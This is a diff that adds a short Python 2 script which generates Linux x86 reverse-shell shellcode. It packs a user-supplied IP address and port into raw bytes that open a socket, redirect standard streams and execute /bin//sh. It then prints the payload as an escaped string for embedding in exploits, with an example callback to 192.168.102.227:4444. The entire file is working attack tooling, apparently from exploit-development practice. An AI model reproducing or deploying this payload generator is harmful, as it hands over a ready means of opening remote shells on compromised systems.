@@ -1,0 +1,23 @@
+#!/usr/bin/python
+
+
+import struct
+import sys
+
+# Usage: script.py <ip address> <port number>
+#example: ./script.py 192.168.102.227 4444
+x = sys.argv[1]
+y = sys.argv[2]
+
+ip = [int(i) for i in x.split(".")]
+
+ip_address = struct.pack("!4B",ip[0],ip[1],ip[2],ip[3])
+port = struct.pack("!H", int(y))
+
+rev_shell = ("\x31\xd2\x6a\x66\x58\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\x87\xda\x68" +
+ip_address +
+"\x66\x68"
++ port +
+"\x66\x53\x89\xe1\xb0\x66\x43\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x0b\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80")
+
+print '"' + ''.join('\\x%02x' % ord(c) for c in rev_shell) + '";'
